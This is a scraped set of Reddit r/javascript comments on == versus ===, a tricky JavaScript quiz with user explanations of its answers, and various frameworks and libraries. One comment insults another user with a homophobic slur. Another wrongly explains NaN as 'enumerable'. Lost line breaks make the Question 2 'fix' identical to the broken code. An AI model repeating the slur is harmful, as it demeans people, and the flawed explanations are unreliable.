Do they, though? I'm not saying every average-or-above-average JS programmer thinks `==` behaves randomly and summons Zalgo, but I would argue that they don't fully understand how it behaves for every possible combination of operands and what the implications are. There's a difference between being able to get a perfect score on a pop quiz of language edge cases (see the comment elsewhere in this discussion with examples of "strange" combinations of operands) and being a competent programmer. Namely the latter is primarily about structure and readability (or performance and correctness) and less about knowing every single language feature whether you use it or not -- especially when you happen to work with more than one language and may have to deal with context switches. It only takes one programmer guessing wrong once to introduce subtle bugs. Granted, this is true for various different issues ranging from type safety (i.e. static vs inferred vs dynamic) to naming conventions, but with `==` vs `===` it can be boiled down to a simple cost/benefit analysis: for most intents and purposes, using `==` outside the eccentric edge cases saves you typing one character at the cost of introducing a lot of additional code paths and therefore an increase in conceptual complexity (even if you hand-wave most of the new code paths by saying you don't care about them because they only apply to invalid input or the laws of the universe spontaneously changing). I'd say you can make an argument for `foo == null` to replace `foo === null || foo === undefined`, but then I would argue that the number of situations where you want to treat `null` an `undefined` the same without also treating the empty string, the number zero and/or the boolean value `false` the same (i.e. where you can't just check for `!foo` -- previously intercepting zero, the empty string or `false` if you need to make the distinction) is pretty slim. It's a matter of realistic expectations: even geniuses make mistakes. Your code doesn't have to be readable to an idiot in a hurry, but you might want to improve the readability for a competent developer in a hurry or a very thorough idiot (after all, being stupid is less of a permanent condition and more of a situational state of mind: we're all stupid about something even if some people are stupid about more things than others). That said, if your team fully understands the implications of the code you're writing and you've established your own conventions, that's perfectly fine. As long as I don't have to work with your code, I couldn't care less what it looks like.
85%, only because I do these quizzes every time one is posted.
There are millions of them so which ones? We learned jQuery to see what the fuss was about and quickly dumped it for being too big and slow. We learned jQueryMobile cause we had to and quickly dumped the job/client for being stupid to use it. Sometimes we'll pull in a library to use it till we create our own version cause our own version has always been smaller, faster, etc. Other than that, we don't use other people's stuff cause we're better than that.
I absolutely agree. Except I would be careful not to conflate "be an adult" with "be perfect". The reality is that we don't always write perfect code, simply because *programming is hard*. `===` makes comparisons more explicit, per definition. Explicit code is easier to read (again, slippery slope: abstractions are a good thing as long as they're relevant to the problem at hand). `===` does not introduce the ambiguity of "did the author mean to compare this thing to that, or to all possible ways this thing could be coerced?". If you only use `==` when you *mean* `==`, that's okay. But in practice most people also use `==` when they mean `===` -- and that's what makes it ambiguous and a code smell: the reader can't know whether you really meant `==` without carefully considering all implications, especially when the code is non-trivial (in the original article, the example is trivial and the author was simply not aware of how properties work, namely that their names are always strings and that enumerating the properties of an array only seems to return the array's indices because everything else happens to be non-enumerable but that they are still property names and thus strings nevertheless).
When you say reusable UI components, does that mean that JQ for you is more of for the presentation and DOM selection? So no to jQuery AJAX?
Doesn't matter whether you considered it a reason or not, *mentioning* it in the scope of this discussion implies it is an argument and thus makes it a red herring. It's like saying "you shouldn't trust Joe because Linda says he's not very trustworthy, besides I hear he murders kittens" (implying you also shouldn't trust Joe because he murders kittens). As for `==` when no coercion is needed: you're basically asking "what about `==` when I actually do mean `===` and they are in fact interchangeable unless reality is suddenly broken". When you *mean* `===` (i.e. "this is that" rather than "this is kinda like that or they can be coerced in a way that makes them equal") you probably should be using `===`. Sure, they are functionally equivalent, but they are not semantically equivalent. It's like saying "every person in this room is a kitten murderer" when there is only one person in the room and that's the person you're talking to. Sure, it may be functionally equivalent to saying "you're a kitten murderer", but it's needlessly unspecific (plus the person you're talking to will likely feel the need to check whether they are in fact they only person in the room, e.g. whether you're technically outside because you're standing in the doorway or whether that means you're also a kitten murderer).
The company I worked for used Prototype.js and I hated it. After a long while we got to convert to jQuery, and loved it. I've tried AngularJS and others somewhat, but find it more productive to stick with jQuery for the work I do. Most of the new frameworks are young still, and for some tasks they just don't cut it. But they do help a lot when starting up a new site/page.
I dunno, RESTify seems really nice for it's niche. I've seen a lot of really nicely architected and clean hapi.js applications. Not to mention the whole #nodebf thing that Walmart did with it. Granted, that wasn't just the framework and Eran and crew are geniuses - still I think gives the framework a lot of credibility.
I don't think Sails.js is ready, a lot of their claims don't really pan out - and that have some kind of bad magic in there from what I saw at the meet up at Rackspace in Dec. Flatiron isn't really maintained any more as mentioned above, and I'm not entirely sure total.js is worth looking at either...
Oh hey, it's drunkenfaggot who appears to be drunkenasshole. Go away oh one who apparently has no workload.
No. I actually am saying what about when you have something like 2 == 2. In this instance we are not checking for type equality, so that check is avoided. And you are also not coercing one to a different type, so we avoid that as well. Regardless. Use == if you want. Use === if you want. They are both language features. If you decide to use one over the other I don't really care. This is all a meaningless fight. People will always fight for both sides so this will always be a fight. One isn't stupid for using == and one isn't stupid for using === (except when they k !== undefined &amp;&amp; k !== null because that is just dumb)
We get it, JavaScript is quirky. Making a quiz to prove it and make people feel stupid seems..well, stupid.
75% I was like WTF when I saw the answer for [] + [] + 'foo'.split(''). And pissed off that I got the new new foo one wrong.
Got 40%, better than expected. I'm shit at JS.
You need to know stuff other than jquery?
Those major "SPA" players were proven to be doing it wrong, period (at least Facebook, go google 'FastBook Sencha' :). HTML5 is not bad because you don't know how to optimize it. Yet......they have *their* own framework like this we should be using......right?). I think the issue is that Angular came at the wrong time because it is so monolothic. NPM is all about tiny modules that do ONE thing really, really well. Slowly, you are seeing this mental shift more in more on the client and server side of js. In the last year, how many posts have you seen on maybe not needing jquery? In part this mental perspective has come from the idea of scaling down for mobile. We HAVE to think mobile first. It isn't some far off dream that most web traffic is going to come from mobile in the future and that most people (there are countries outside the U.S. where people use mobile phones and don't have our GDP ;) ) are going to be using lower-end, low power devices for a very, very long time. These considerations I mention are the considerations that actually matter in software. What doesn't matter is how easy a framework makes your job. That has no end result for the people that use your software outside of *possibly* giving them a quicker ship date. Finally, I'd like to point out that the lack of Object.observe in ES5 is not a short coming per-say. Do you know of another language with something exactly analogous to it? That seems to be an evolutionary need that this community noted and is now being reached (but it's nowhere near ready for prime time anymore than shadow dom at this point). So my point is, this isn't a compiled language in a controlled environment as the one where MVVM started. Two way binding means something completely different internally here and it does have very significant performance implications. Again, it all comes down to what you need to accomplish. If I have some simple CRUD applications I am putting together and I know users are mostly chrome/desktop, you bet I'll use angular because I am going to "just get it done" quickly. However, if I am looking at something like I mentioned before, it's gonna be backbone and solid/proven design conventions that I know can scale and perform on all of those devices. 
I think its going well, I wound up settling for underscore-contrib instead of score under, but its flip function allows me to use compose in my code, so I'm getting familiar with that style of programming. I find that its hard to use this stuff in the workplace. I may be familiar with it, and one or two other co-workers might, but to some people this stuff looks like hieroglyphics, and if they're not motivated to learn it they won't, and you wind up with people that can't read your code. 
Would be really nice to have something that had built in placeholder support (via the placeholder attribute, so &lt;textarea placeholder="Hello world"&gt;&lt;/textarea&gt;) and something that works with javascript validation plugins like jquery.validate or other common ones.
Om port to what? Om is already React for clojurescript and Mori and React works very nice togheter
I'm having a go of WebStorm - it's cool! I can't find out how to change the colors of the syntax coloring - the highlighting of incidents of the variable I've clicked on are barely noticeable - just a light lilac.
Scholastic as in what's taught in schools. School only teaches you so much... It taught me the foundations. I have become a much better JavaScript user from individual study and the internet forums. Real world experience is something that just can't be duplicated in school.
20% correct. Pffft!!
Oh, I absolutely agree that the NPM/Unix philosophy (tons of tiny tools that do one thing and one thing only) is a great approach and that's why I don't embrace Angular's "module" system (which is really just a fancy wrapper around its DI registry). That said, as far as I can tell the "the future will be mobile" trend seems to have reached an equilibrium with regard to small mobile devices, at least in terms of usage patterns: UI differences aside, most people have clearly distinguishable sets of tasks they want to perform on a smartphone versus a tablet, notebook or desktop (with the latter three being roughly equivalent, although tablets tend to see a mixture of both). Bandwidth is important, but so is support for offline capabilities (which some libraries like Ember seem to just handwave by pretending latency doesn't exist and servers are always reachable). Not being a US resident I absolutely agree that you shouldn't generalize based on your own experiences (by virtue of being a techie you're already not representative of the general public), but you should focus on your intended (and potential) target audience: if you, for example, make a banking app, even if it is currently US-only, your audience is everyone who wants to do banking (i.e. pretty much most people eventually), so even when you start in the US you should keep the global situation in mind; but if you are making an app with a much more clearly defined target audience (e.g. an analytics dashboard) your audience can deviate from the general public in lots of ways. I guess what I'm trying to get at is what I said early on: there is no panacea. No solution is perfect for every scenario, whether it's a full-featured framework or a set of minimal libraries.
The original goal of fn.js was to provide a functional utility library that more closesly adhered to functional tenets and could be used in place of underscore and lodash. Since underscore's API doesn't allow composition of many of it's own methods out of the box, I found it frustrating for a functional style of development. I also felt that the library should push you towards purer FP by understanding why it differs from OO in regards to state. So in this regard, fn.js is opinionated in that it should never introduce side effects or state into calls, but can also be frustrating for those expecting to easily be able to override contexts or use easily with state-driven handlers. The alternative is then to pass items that you want to affect the outcome of functions to be passed in as arguments. JavaScript is not a pure functional language, and therefore there is no true enforcement of some of these ideas. Rather, fn.js bases it's guidelines on letting you form a style and strategy based on conventions rather than language semantics.
Mori is a bit different as it also provides Clojure's immutable data structures (List, Vector, HashMap, Set, etc.) which are very powerful.
"I just use jQuery here and there... What should I know about JavaScript before I come in tomorrow?" LOL.
You know what would make this quiz useful? Explain the answers. It's clearly designed to deceive people and put some really hard questions next to really obvious questions. And it's so full of things you'd never see, that the point is clearly that people should be getting things wrong. But you know what's better than saying "YOU'RE WRONG HAHA" is actually teaching them why they're wrong. A test where you learn nothing is useless.
I'm just really trying to learn from others about fn coding in js (tired of pure OO in any language). So, I was wondering if anyone has considered lazy.js? More importantly, does what lazy offers encourage fn programming and "data thinking" as Micheal Fogus puts it in "Functional JavaScript"? http://danieltao.com/lazy.js/ I am basing this solely off of a podcast: http://javascriptjabber.com/088-jsj-lazy-js-with-daniel-tao/ My apologies if this post hijacks the thread at all.
Sure but if you focus on the tenets of functional style and strategy it could deserve a mention (or more), as immutability is such a big part of functional style.
Whoa whoa whoa, I was actually agreeing with you bro. Was just commenting on the fact that we as js devs can't take a day off without falling behind.
I used ng-grid and it worked really well, overall it was fairly feature-complete with good documentation. However, I think the project's popularity is its own worst enemy, for to me the most concerning aspect was the total silence on issues that were reported. I entered at least 1 myself, which included a reproduction plnkr and a proposed fix for the problem, and yet I never heard a word from them. I also participated in a couple other issues, and those likewise were seemingly ignored. I get it -- the project is watched by over 100 people, starred by almost 800, and forked around 450 times. Additionally, there's currently 328 open issues (and 645 closed). That's a _lot_, more than any single person could handle and likely enough work to keep 3-4 FTE's busy, so I can certainly understand if this thing blew up and the original devs found themselves with a beast out of their control. But that sucks, because when I can't get a vendor to accept my bug report and it forces me to fork the project myself, then that's a pretty big roadblock. All in all, it looks like the project is dying -- at least from looking at the [github activity](https://github.com/angular-ui/ng-grid/graphs/commit-activity), the last meaningful commit was 8 months ago (and the last release was made around the same time). Eight months is a terribly long time for a young software project.
[**@slicknet**](https://twitter.com/slicknet): &gt;[2014-02-06 15:51:47 UTC](https://twitter.com/slicknet/status/431455189963264000) &gt;Just for following me, I'll give you 40% off my new book. Use code "NCZ" here: [*nostarch.com*](http://www.nostarch.com/oojs) ---- [^[Mistake?]](http://www.reddit.com/message/compose/?to=TweetPoster&amp;subject=Error%20Report&amp;message=http://reddit.com/1x6sey%0A%0APlease leave above link unaltered.) [^[Suggestion]](http://www.reddit.com/message/compose/?to=TweetPoster&amp;subject=Suggestion) [^[FAQ]](http://np.reddit.com/r/TweetPoster/comments/13relk/) [^[Code]](https://github.com/buttscicles/TweetPoster) [^[Issues]](https://github.com/buttscicles/TweetPoster/issues) 
Fair explanation. I guess the point is, choose which one you need because it fits what you are doing. Not because someone just says coercion is bad. You should never blindly follow "rules" that people make up. You should question them. Learn why someone would say that. And then if it doesn't apply to you, don't follow it. But you should question it. I hate when people say "don't do this, because it is bad." Both == and === have their uses. People should be understand why both are useful and then make their own decision on whether to use == or ===.
First time this was reposted the OP at least linked to the right page.
Is this the same thing? http://www.amazon.com/Principles-Object-Oriented-JavaScript-Nicholas-Zakas/dp/1593275404/
The one that threw me was something I felt definitely was a syntax error. I guess I'm wrong. Also, named functions are tricky. Scored a 75 too though. 
Yes, seems to be. With 40% off on that link it'd come out to about $1 less than on Amazon. :)
Those are [labels](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/label), and that question was full of misdirection. var bar = 1, foo = {}; foo: { bar: 2; baz: ++bar; }; foo.baz + foo.bar + bar; Basically, the label and everything inside it was a red herring (just ignore it).
I got a 75 too. I wasn't sure with the function foo () {}; var foo; I thought the last one would be the one actually done. Guess functions are more important.
You will retain the knowledge much better if you're forced to seek out the answers yourself. If they just gave you a short blurb with the answer, sure you might remember it for this one specific application, but you likely wouldn't truly understand what's happening internally, and thus wouldn't actually learn anything -- you'd just memorize it.
Nice. Had an Amazon gift card so I went ahead and bought it there.
How do you mean? If you don't know that something: {} is a label then that doesn't have anything to do with object literals.
That one made me pissed too, I should have known that one.
except my apologies then please. sarcasm detector was malfunctioning when i first woke up.
I mean, not necessarily. Would I retain the answer better if I read a blurb after Googling it, or if I read a blurb right there on the site? It seems the same to me. Plus, for some of those it's not entirely clear where the answer went wrong so I wouldn't begin to be able to Google it. Anything where I did know where it went wrong, I don't need to Google it because it's like "oh, that was part of the predefined truth tables of equality." Whereas certain problems, like the "new new foo" one, I wouldn't begin to be able to Google that (I got that one right, but I could imagine someone having issues) And if we're not meant to learn from this test, the hell is the point of it?
Thanks! That was a thorough explanation with a lot of good information. One thing that never occurred to me was that window.addEventListener("resize",showAlert); is another way of adding a listener. If I may ask, which one is the proper way to add an event listener to a window according to the latest standards? That line above, or this one below? window.resize = showAlert; 
I think the test is mostly for fun, I mean it has a "Warning: Might hurt your feelings" image on the landing page. Poking around a bit more, the author has a book for sale which might tie-into the test, but I don't recall seeing it advertised anywhere. And re: learning, I'd disagree. I see it about like assigning math problems for homework; sure, the prof can just give you a set of problems and then print the answers directly after the question, but will you really learn anything? Or would you learn more by working through the problems, iterating over solutions until you happen to devise the correct solution? If you don't have anything "to Google", then you're forced to deconstruct the problem. While deconstructing, it should become evident to you that \*something\* is not happening the way that you'd imagined, and from there you should be able to devise some test code to play around with any hypothesis that you come up with. Once you've isolated the behavior, it should be trivial to find some reference to it on the net. You're acting like you've never Googled strange behavior before... you don't always have an obvious error message to go off of.
CKEditor is GPL/MPL
Thanks. It's nice getting an actual reply, instead of getting downvoted for an innocuous comment. 
http://imgur.com/dhMWKVW
Have a point for honesty :D
*agmcleod looks at question 1. Exclaims "god damn it"*
I recommend learning more about JS, if your foundation in the language is strong then you will be better suited to pick an MVC/VM framework that not only fits the needs of you and your team but also your philosophy as well. I know that this isn't the answer you're looking for, but it's the best advice I can give.
Well, a lot of these are a pain to Google ('why does the typeof a named function returning an object return undefined?') - and for a quiz that is obviously showing you the quirks of javascript, it seems odd that it wouldn't give any sort of explanation. If it explained why it was the way it is, step-by-step, you would be deconstructing it by seeing someone else deconstructing it. Learn by doing is always the best way, but learn by watching someone else doing is the next best!
Not a bad article. I love how this security article is being downvoted so far. What will it take for web developers to understand that all languages suck and just because it happens to be the language you like it can't possibly be a fuck-all scary basement security nightmare too?
I believe that behavior is the result of [variable hoisting.](http://www.adequatelygood.com/JavaScript-Scoping-and-Hoisting.html)
OP is still a gibbon, but at least has a sense of humor.
I had a go at explaining the first 10 questions. :-) Question 1 ----------- var foo = function foo() { console.log(foo === foo); }; foo(); When console.log is called, the variable foo resolves to the variable "foo", which contains a function. In fact, the second foo has no impact. This would work as well: var foo = function() { console.log(foo === foo); }; foo(); Comparing a function to itself returns true, so the console prints true. Question 2 ----------- function aaa() { return { test: 1 }; } alert(typeof aaa()); You would expect this to print "object", since aaa() seemingly returns { test: 1 }. However, the line break after return makes Javascript treat this as a simple return (';' are -sometimes- optional in Javascript). Functions that simply call 'return;' actually return "undefined", so the answer here is "undefined". If you wanted aaa() to return the object properly, this would be the fix: function aaa() { return { test: 1 }; } alert(typeof aaa()); Question 3 ----------- Number("1") - 1 == 0; Number is an object wrapper for primitive numbers in Javascript. I've actually never used it before, but it will try to convert anything you throw at it to a number, or return NaN if that doesn't work. So Number("1") simply resolves to 1, and 1 - 1 == 0 resolves to true. Question 4 ----------- (true + false) &gt; 2 + true; Ok let's break this one down: The one thing you need to know with this question is that '+' automatically converts values to numbers as needed. '+true' results in 1, '+false' results in 0. So true + false will result in 1: true + false = 1 So we're left with 1 &gt; 2 + true The '+' operator will be calculated first (order of operations): 2 + true = 2 + 1 = 3 So all that remains is 1 &gt; 3 Which returns 'false' Question 5 ----------- function bar() { return foo; foo = 10; function foo() {} var foo = '11'; } alert(typeof bar()); This one is a little trickier. In Javascript, function declarations are hoisted to the top of the function in which they are declared. This simply means that you can call a function that was declared at a later time, provided this function was declared in the same block scope. So when bar() executes, the reality will look a bit like this: function bar() { function foo() {} return foo; foo = 10; var foo = '11'; } alert(typeof bar()); Now it's become simple. When we call bar, the function foo is declared. Then we simply return foo. The rest of 'bar' is not executed. That's why the output will be "function". Question 6 ----------- "1" - - "1"; This one is rather easy. Just like the '+' operator, the '-' operator has the power to convert values to numbers. So this expression simply resolves to 1 - -1 = 1 - (- 1) = 2 Question 7 ----------- var x = 3; var foo = { x: 2, baz: { x: 1, bar: function() { return this.x; } } } var go = foo.baz.bar; alert(go()); alert(foo.baz.bar()); This one gets tricky, and requires knowledge about the "this" operator in Javascript. Typically, the "this" property refers to the object to which the function belongs. However, "this" can change depending on how you call the function. That's why "this" is often referred to as the "invocation context", or the context object with which the function was invoked. For educational purposes, let's simplify the assignment to this: baz: { x: 1, bar: function() { return this.x; } } When you call baz.bar(), the "this" parameter will refer to the "baz" object. So "this.x" will resolve to 1. However, when you capture the bar function in a variable, and then call it separately, you circumvent the "this" mechanism. var captured = baz.bar; captured(); When you call "captured()", the this variable inside the function will be the global object ('window' in browsers). So the answer to the question is: 3, 1 Question 8 ----------- new String("This is a string") instanceof String; Ehhh this returns true, I don't think there's a need for much explanation here. Question 9 ----------- [] + [] + 'foo'.split(''); This is another application of the conversion properties of "+". If "+" is used on arrays or strings, the "+" operator will try to convert the other value to a string as well. Empty arrays result in an empty string, and non-empty arrays result in a comma-separated representation of its values. So [] + [] + 'foo'.split('') = "" + "" + "f,o,o" = "f,o,o" Question 10 ------------ new Array(5).toString(); new Array(5) creates an empty array with 5 slots. Every slot will contain "undefined" as the value. Like I explained in the previous question, calling toString on an array results in a comma-separated view of the array. Usually, converting undefined into a string results in the text "undefined". Take the following example: var empty = new Array(1); console.log("" + empty[0]); // prints "undefined" (a string!) However, when converting an array to a string, any undefined cells are converted to empty strings instead. So the result is new Array(5).toString() = ",,,,," 
$20 shipping to Canada... wtf?
In combination with this install a "linter" to catch silly mistakes before you even run the code: http://www.jshint.com/ Most text editors have plugins for this. Think of it as the wavy red lines underneath your spelling mistakes when you write an email, only for code.
Ahah I think that the only people who could get all correct are those who are used to see things as convoluted as that, i.e. shitty programmers.
Thanks for the suggestion, WoollyMitterns, I've included in my post, check the "Your word" section.
Yea I know but I didn't know what precedes what. 
FYI: http://imgur.com/UnVbCSt So your point about how fast they are, is not always true.
What got me with that one is that I knew var foo would be hoisted to the top, but I forgot that entire functions are hoisted too. JavaScript is weird.
60%, never coded in JS before.
I've really been enjoying these.
I think it is because NaN is enumerable, that is it does not have one to one correspondence with another number or object. I am not sure the exact reason, but this seems to be true in most languages I have programmed in. If you want to check if something is NaN you need to use the isNaN() function.
I created TodoMVC and co-authored the YAFS post the OP is referring to. If what you took away from YAFS was that we want developers to stop innovating and working on new, better ways to solve common problems in the community, I apologize - that's not at all what we're saying. We work with framework authors and open-source projects every day and their work has been critical to us evolving the patterns and options devs have to build applications. That's why we have Angular, Ember and Backbone today. We welcome true engineering innovation. What we're saying is that we see (first-hand) new MV* frameworks created a few times a week and in many cases, they're (unfortunately) not bringing something new to the table. I know for some that's hard to hear. A developer will dislike a certain minor aspect of an existing solution, but rather than trying to work with the authors of that framework to fix the underlying problems (which would help a LOT more devs), they'll just create their own solution and post it on GitHub. Often without documentation, tests or a good explanation of how they differ. Imagine a developer comes along and tries to understand how this differs from what's already out there - it's hard. I love our community deeply. I want to see us continue to create great things. I hope that we can just change the way we've been going about it. Collaborate over creating silos. If you're going to re-invent the wheel, make a wheel different to the ones we've already seen. Strive to build better solutions by engaging with existing communities and understanding what problems have been solved, which ones haven't and where we can truly have the biggest opportunities for positive change.
I'm trying to wrap my head around benchmarking, comparing, contrasting, etc. the following: * O'Steele's functional.js * wu.js * lo-dash * underscore * scoreunder (?) * lazy.js * fn.js * mori
I went through exactly the same thought process. Read the first line: "Ahh, variable hoisting, obviously it will evaluate to that". Read second and third lines: "Fuck."
So why not maintain your own version and when people bitch in their issues list, you can point them to yours?
This is my entry point into your gameapalooza and I dig what you're doing. Keep it up!
Let me try to do the other 10: Question 11 ---------------- var myArr = ['foo', 'bar', 'baz']; myArr.length = 0; myArr.push('bin'); console.log(myArr); Setting the length of an array actually resizes the array, and removes elements past the new length. Therefore `myArr.length = 0` empties the array, and thus when 'bin' is pushed `myArr == ['bin']`. Question 12 ----------------- String('Hello') === 'Hello'; This one is a little tricky. `String('Hello')` is not actually calling a constructor, but a function (note the lack of the `new` keyword). This function simply returns ` 'Hello' `, and thus the result is true. Question 13 ----------------- var x = 0; function foo() { x++; this.x = x; return foo; } var bar = new new foo; console.log(bar.x); Let's focus on the line `var bar = new new foo` first here. First the last part , `new foo`, gets executed. This calls `foo` as a constructer, but in Javascript even constructors can return anything. In this case the function `foo` returns itself, instead of the `this` object as it would if no explicit return value was defined. Thus `new new foo` becomes `new foo`. This again returns `foo`. Since foo is only a function it does not have the property `x`, and thus `bar.x` is undefined. Question 14 ----------------- "This is a string" instanceof String; `"This is a string"` is a primitive of type `string`, which is not an instance of anything since it's not an object. Therefore `"This is a string" instanceof String` is false. Question 15 ----------------- var bar = 1, foo = {}; foo: { bar: 2; baz: ++bar; }; foo.baz + foo.bar + bar; This one requires a very rarily used feature called labels. At first it looks like `foo : { ... };` is a syntax error and should've been `foo = { ... };`. However, instead of assigning an *object* to foo, it creates a *label* called foo. These labels can be used to jump to outer loops (see [mdn](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/label)), but here they have virtually no effect here. Therefore `foo` is an empty object throughout the entiry script, and thus `foo.baz` and `foo.bar` are undefined. As Moeri explained before, `+` tries to convert it's operands to numbers. Since `undefined` isn't a number, this results in `NaN`. If you add anything to `NaN` you will always get `NaN`. Therefore the result is `NaN`. Question 16 ----------------- var myArr = ['foo', 'bar', 'baz']; myArr[2]; console.log('2' in myArr); The `in` operator checks if a property is present in an object. An array is acutally an object with numeric properties. Since it has 3 elements it has the properties 0, 1 and 2. Therefore `'2' in myArr` is true. Question 17 ----------------- var arr = []; arr[0] = 'a'; arr[1] = 'b'; arr.foo = 'c'; alert(arr.length); The length of an array is only influenced by it's numeric properties. Thus `arr.length` is 2. Question 18 ----------------- 10 &gt; 9 &gt; 8 === true; The `&gt;` operator has a higher precedence than `===` and is left-to-right associative. If we add the implicit parentheses we get this: ((10 &gt; 9) &gt; 8) === true; This evaluates further to: ((10 &gt; 9) &gt; 8) === true; (true &gt; 8) === true; (1 &gt; 8) === true; false === true; false; Question 19 ----------------- function foo(a, b) { arguments[1] = 2; alert(b); } foo(1); The `arguments` object only contains entries for arguments passed to the function. Since only one argument is passed, both `arguments[1]` and `b` are initially undefined, and do not influence eachother. Therefore `b` is still `undefined` in the alert, and `undefined` will be alerted. Question 20 ----------------- NaN === NaN This is one of the weirdest things in Javascript: `NaN` is actually a number (`typeof NaN === 'number'`), and thus it is not not-a-number. Therefore `NaN === NaN` returns false. `NaN` is actually equal to nothing. To test if a variable `x` is `NaN` you can either do `isNaN(x)` or `x !== x`. The later one is pretty interesting, since `NaN` is the only value which is not actually equal to itself! 
Haha I did this a little while ago and there were literally only 2 people who took it before me
We just released a new version and fixed that. :-)
Yes but then how can he sell his [book](http://davidshariff.com/how-to-become-advanced-front-end-developer-ebook/) if he teaches you for free? /s
Thanks for the suggestion. I'll take it into consideration.
I might, but my project that implemented ng-grid has since died, and so I've no need for it anymore.
I think you forgot to *fix* #2. This would return the object and alert "object": function aaa() { return { test: 1 }; } alert(typeof aaa());
I don't need real time - I don't do day trading. I usually do my planning after the markets are closed anyway.
Much better. But it seems to insert some 4 spaces in place of a tab, meaning if you hit the tab key accidentally, you've got to hit backspace 4 times. Perhaps insert a literal tab char instead of spaces? 
There's also a parallax scrolling bug on your homepage that manifests itself in Chrome M32 (OSX 10.9): http://i.imgur.com/AWSxL4m.png This is probably a chrome bug, and not one due to you persay, but if you can find a workaround then that makes presentation much better. 
another tip then dont scrape at late hours since for some reason yahoo zeros all its prices during late hours.
The resolution would be helpful. Thanks!
I'm working on improving performance of a huge Knockout.js based app (made by someone else). I already [learned](http://stackoverflow.com/questions/21605751/poor-performance-when-displaying-multiple-elements) that 'template' binding should be avoided as it causes a lot of HTML parsing (which is expensive). Now I'm stuck on reducing DOM manipulation.
The highest score I could get was 500. Great game, really addicting.
Although I do like the simplicity of your router, what I like the most is how clean your code is. Well documented too. Great job.
Funny, they all showed up as faster for me on Chrome/Linux. Even on that screenshot you'll find `===` being slightly faster for booleans and significantly faster for different types. I don't know what the standard deviation is with these numbers but the biggest differences in favour of `==` seem to be ~73.7M vs ~74.6M (~1.15% better) for numbers and ~3.24M vs ~3.24M (~0.15% better) for strings, whereas the biggest differences in favour of `===` seem to be ~13.3M vs ~11.8M (~11.74% better) for booleans and ~5.95M vs ~3.86M (~35.17% better) for mixed types -- even though my argument about this being premature micro-optimisation still stands, I would say that the differences in favour of `===` seem to be more signifant (by virtue of being more than an order of magnitude bigger). That said, in the post you replied to I wasn't arguing our imaginary `equal` macro would be less efficient -- it would simply be more complex.
Does the script depend on jQuery? In that case, the size of the router file is trivial, unfortunately. 
regarding number 20: that is not actually not that weird. The floating point definition in IEEE754(which almost all systems implement) [defines that every comparison with NaN returns false](http://en.wikipedia.org/wiki/IEEE_754-1985#Standard_operations). Even when comparing to NaN itself. So this is not limited to just javascript, but all software and hardware that implement floating point operations handle this in the same way.
#####&amp;#009; ######&amp;#009; ####&amp;#009; Section 16. [**Standard operations**](http://en.wikipedia.org/wiki/IEEE_754-1985#Standard_operations) of article [**IEEE 754-1985**](http://en.wikipedia.org/wiki/IEEE%20754-1985): --- &gt; &gt;The following functions must be provided: &gt; &gt;&gt;* [Add, subtract, multiply, divide](http://en.wikipedia.org/wiki/Arithmetic_operations) &gt; --- ^Interesting: [^IEEE ^floating ^point](http://en.wikipedia.org/wiki/IEEE_floating_point) ^| [^X87](http://en.wikipedia.org/wiki/X87) ^| [^NaN](http://en.wikipedia.org/wiki/NaN) ^| [^William ^Kahan](http://en.wikipedia.org/wiki/William_Kahan) *^\/u/Zeroto ^can ^reply ^with ^'delete'. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less.* ^| [^(FAQs)](http://www.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/) ^| [^flag ^a ^glitch](http://www.reddit.com/message/compose?to=/r/autowikibot&amp;subject=Glitched comment report&amp;message=What seems wrong: (optional description goes here\)%0A%0A---%0A%0AReply no. 47110:%0Ahttp://www.reddit.com/r/javascript/comments/1x646n/tricky_javascript_web_quiz/cf8x07y)
Fair enough, although I would argue Angular is not *that* new compared to similar libraries. √çt being stable and mostly production-ready is however a relatively new thing (I evaluated it for an app two years ago and as far as I recall it just wasn't ready enough for us at the time). As for your examples on mobile in-field apps: maybe this is a culture thing. I don't live in the US so I am unfamiliar with how these apps are used there. As far as I can tell BYOD and internal apps aren't mixed much in Germany (AFAICT even the notion of BYOD seems to be limited to the kind of companies that run SAP and Oracle enterprise software -- or tiny startups where you probably won't find these underpowered smartphones). I'm aware of the technical difficulties faced in providing good UX (sorry for the buzz word) to customers on a wide variety of devices -- this isn't a new problem, it's just new to HTML5 apps. It's basically the last app generation's feature phone problem (or the still ongoing HTML e-mail problem) under new guise. Compared to that, the Browser Wars were sane.
That's =~. ~= is reserved for when they get a binary ~ so that $a ~= $b is the same as $a = $a ~ $b.
because that is how it is defined in [IEEE754](http://en.wikipedia.org/wiki/IEEE_754-1985#Standard_operations). All software and hardware that implement that(and that is most) will return false for NaN == NaN.
Apparently not. Notice the second foo has : after it, not a =. This makes it a label, and makes everything inside of it labels as well.
Thanks for signing up. Tell your friends!
Have you looked at the source? It does not depend on jQuery.
Went pretty well. I started to experiment with various frameworks that met my needs. I'm not learning a programming language in and out just for the sake of knowing it. 
I looked at the examples and saw the inclusion of a jQuery library. That is why I asked the question. If it does not depend on jQuery then the small size is wonderful accomplishment.
&gt;How counter-intuitive is that a change to the arguments (arguments[0] = 'alien') changes the named argument fromWhom? Not in the least? Not at all? To be honest I find a silent failure to update something way worse. And indeed intuition would tell you that changing the arguments would change the ...value of the arguments, so perhaps "intuition" here is really more to do with experience or understanding of the language.
I didn't see that coming... wow. You kind of just blew my mind. Thanks for the knowledge though.
thanks! Hope you keep posting these 
Retina Macbook Pro, 15", 3rd generation. $(window).width() returns 1440px width, native resolution of the screen is 2880 x 1800. 
Most of the time, sure. But each of these questions relies on very specific knowledge of Javascript. Like, for example, the one that defines a function and var of the same name, within a function. What's the value of that variable name? That relies on knowledge that the compiler takes all var and function definitions and puts them at the beginning of your scope. Which is actually pretty important sometimes. Common knowledge is that you really need to put the var statements at the beginning of each function definition, but this shows why that is. See, and a little blurb like that, that's not that hard to add to a quiz where people are expected to not know most of the answers.
For those that weren't aware, this is a copy of an existing game on the App Store called Dots. Not trying to detract from OP's accomplishment but it sounds like others liked this game, maybe they want this app. https://itunes.apple.com/us/app/dots-a-game-about-connecting/id632285588?mt=8 
After having written JavaScript almost daily for 5 years, I have never encountered a single one of these issues. I appreciate that use strict should be used, but I highly doubt someone even half aware of what they're doing will save hours from the situations outlined. The linter suggestion mentioned is drastically more useful than use strict could ever hope to be. 
